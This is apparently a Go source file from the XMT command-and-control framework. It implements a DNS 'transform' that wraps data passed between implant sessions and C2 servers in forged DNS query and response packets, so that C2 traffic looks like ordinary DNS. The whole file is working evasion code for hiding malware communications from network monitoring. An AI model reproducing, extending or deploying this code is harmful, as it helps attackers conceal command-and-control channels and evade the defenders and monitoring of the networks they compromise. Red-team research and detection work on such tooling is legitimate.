// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

// Package transform contains built-in implementations of the 'c2.Transform'
// interface, which can be used to manupilate data that is passed between
// Sessions and C2 Servers.
package transform

import (
	"io"
	"strings"
	"sync"

	"github.com/iDigitalFlame/xmt/util"
)

const (
	dnsMax = 2048
	dnsSeg = 256
)

var (
	// DNS is the standard DNS Transform alias. This alias uses the default
	// DNS addresses contained in 'DefaultDomains()' to spoof C2 communications
	// as valid DNS packets.
	//
	// Custom options may be used by creating a new DNS alias or updating the
	// current alias (string array) with new domains.
	DNS = DNSTransform{}

	packets = sync.Pool{
		New: func() interface{} {
			return new(dnsPacket)
		},
	}

	dnsBuiltins struct {
		sync.Once
		e []string
	}
)

type dnsPacket struct {
	_ [0]func()
	b [4096]byte
	n int
}

// DNSTransform is a Transform alias that attempts to mask C2 traffic in the
// form of DNS request packets.
type DNSTransform []string

func createDefaults() {
	dnsBuiltins.e = getDefaultDomains()
}
func (p *dnsPacket) Reset() {
	p.n = 0
}

// DefaultDomains returns an array of DNS names to be used if the DNS Transform
// is empty.
func DefaultDomains() []string {
	dnsBuiltins.Do(createDefaults)
	return dnsBuiltins.e
}
func (d *DNSTransform) pick() string {
	// NOTE(dij): This function has to be on a pointer receiver as it can
	//            be used to set the value to the defaults if needed.
	if len(*d) == 1 {
		return (*d)[0]
	}
	if len(*d) == 0 {
		if *d = DefaultDomains(); len(*d) == 1 {
			return (*d)[0]
		}
	}
	return (*d)[util.FastRandN(len(*d))]
}
func (p *dnsPacket) Flush(w io.Writer) error {
	if p.n == 0 {
		return nil
	}
	n, err := w.Write(p.b[:p.n])
	if p.n -= n; err != nil {
		return err
	}
	if p.n > 0 {
		return io.ErrShortWrite
	}
	p.n = 0
	return nil
}
func (p *dnsPacket) Write(b []byte) (int, error) {
	n := copy(p.b[p.n:], b)
	if n == 0 {
		return 0, io.ErrShortWrite
	}
	p.n += n
	return n, nil
}
func decodePacket(w io.Writer, b []byte) (int, error) {
	var (
		_ = b[12]
		q = int(b[4])<<8 | int(b[5])
		c = int(b[6])<<8 | int(b[7])
		t = int(b[10])<<8 | int(b[11])
		s = 12
	)
	for ; q > 0; q-- {
		for i := 0; i < 64; {
			if i >= len(b) {
				return 0, io.ErrUnexpectedEOF
			}
			if i = int(b[s]); i == 0 {
				s++
				break
			}
			s += i + 1
		}
		if s += 4; s >= len(b) {
			return 0, io.ErrUnexpectedEOF
		}
	}
	for ; c > 0; c-- {
		if s += 10; s > len(b) {
			return 0, io.ErrUnexpectedEOF
		}
		s += int(b[s])<<8 | int(b[s+1]) + 2
	}
	for i := 0; t > 0; t-- {
		if s+6 >= len(b) {
			return 0, io.ErrUnexpectedEOF
		}
		if b[s] != 0xC0 || b[s+1] != 0x0C || b[s+2] != 00 || b[s+3] != 0xA || b[s+4] != 0 || b[s+5] != 1 {
			return 0, io.ErrNoProgress
		}
		s += 10
		i = int(b[s])<<8 | int(b[s+1])
		s += 2
		if _, err := w.Write(b[s : s+i]); err != nil {
			return 0, err
		}
		s += i
	}
	return s, nil
}
func decodePackets(w io.Writer, b []byte) (int, error) {
	if len(b) == 0 {
		return 0, nil
	}
	var i int
	for i < len(b) {
		n, err := decodePacket(w, b[i:])
		if err != nil {
			return i, err
		}
		i += n
	}
	return i, nil
}

// Read satisfies the Transform interface requirements.
func (d DNSTransform) Read(b []byte, w io.Writer) error {
	n, err := decodePackets(w, b)
	if err != nil {
		return err
	}
	if len(b) != n {
		return io.ErrUnexpectedEOF
	}
	return nil
}

// Write satisfies the Transform interface requirements.
func (d DNSTransform) Write(b []byte, w io.Writer) error {
	n, err := encodePackets(w, b, d.pick())
	if err != nil {
		return err
	}
	if len(b) != n {
		return io.ErrShortWrite
	}
	return nil
}
func encodePackets(w io.Writer, b []byte, s string) (int, error) {
	if len(b) == 0 {
		return 0, nil
	}
	var (
		t    = bufs.Get().(*[]byte)
		p    = packets.Get().(*dnsPacket)
		i, n int
		err  error
	)
	for i < len(b) {
		if n, err = encodePacket(p, t, b[i:], s); err != nil {
			break
		}
		if err = p.Flush(w); err != nil {
			break
		}
		i += n
	}
	p.Reset()
	bufs.Put(t)
	packets.Put(p)
	return i, nil
}
func encodePacket(w io.Writer, u *[]byte, b []byte, s string) (int, error) {
	_ = (*u)[511]
	(*u)[0], (*u)[1] = byte(util.FastRand()), byte(util.FastRand())
	c := len(b)
	if c > dnsMax {
		c = dnsMax
	}
	t := c / dnsSeg
	if t*dnsSeg < c || t == 0 {
		t++
	}
	var (
		e = strings.Split(s, ".")
		r = len(e)
	)
	if dnsServer {
		(*u)[2], (*u)[3], (*u)[4], (*u)[5] = 132, 128, 0, 1
		(*u)[6], (*u)[7], (*u)[8], (*u)[9] = 0, 1, 0, 0
	} else {
		(*u)[2], (*u)[3], (*u)[4], (*u)[5] = 1, 0, 0, 1
		(*u)[6], (*u)[7], (*u)[8], (*u)[9] = 0, 0, 0, 0
	}
	(*u)[10], (*u)[11] = byte(t>>8), byte(t)
	if y, err := w.Write((*u)[0:12]); err != nil {
		return 0, err
	} else if y != 12 {
		return 0, io.ErrShortWrite
	}
	for i := 0; i < r; i++ {
		if len(e[i]) > 256 {
			e[i] = e[i][:250]
		}
		(*u)[0] = byte(len(e[i]))
		var (
			k      = copy((*u)[1:256], e[i])
			y, err = w.Write((*u)[0 : k+1])
		)
		if err != nil {
			return 0, err
		} else if y != k+1 {
			return 0, io.ErrShortWrite
		}
	}
	(*u)[0], (*u)[1], (*u)[2], (*u)[3], (*u)[4] = 0, 0, 1, 0, 1
	if y, err := w.Write((*u)[0:5]); err != nil {
		return 0, err
	} else if y != 5 {
		return 0, io.ErrShortWrite
	}
	if dnsServer {
		(*u)[0], (*u)[1] = 192, 12
		(*u)[2], (*u)[3], (*u)[4], (*u)[5], (*u)[6], (*u)[7] = 0, 1, 0, 1, 0, 0
		(*u)[8], (*u)[9], (*u)[10], (*u)[11] = 3, byte(util.FastRand()), 0, 4
		(*u)[12], (*u)[13] = byte(util.FastRand()), byte(util.FastRand())
		(*u)[14], (*u)[15] = byte(util.FastRand()), byte(util.FastRand())
		if y, err := w.Write((*u)[0:16]); err != nil {
			return 0, err
		} else if y != 16 {
			return 0, io.ErrShortWrite
		}
	}
	var i int
	for x, j := 0, 256; x < t && i < len(b) && i < c; x++ {
		(*u)[0], (*u)[1] = 192, 12
		(*u)[2], (*u)[3], (*u)[4], (*u)[5], (*u)[6], (*u)[7] = 0, 10, 0, 1, 0, 0
		if k := len(b) - i; k < 256 {
			j = k
		}
		(*u)[8], (*u)[9], (*u)[10], (*u)[11] = 0, 0, byte(j>>8), byte(j)
		if y, err := w.Write((*u)[0:12]); err != nil {
			return 0, err
		} else if y != 12 {
			return 0, io.ErrShortWrite
		}
		v, err := w.Write(b[i : i+j])
		if err != nil {
			return 0, err
		}
		i += v
	}
	return i, nil
}
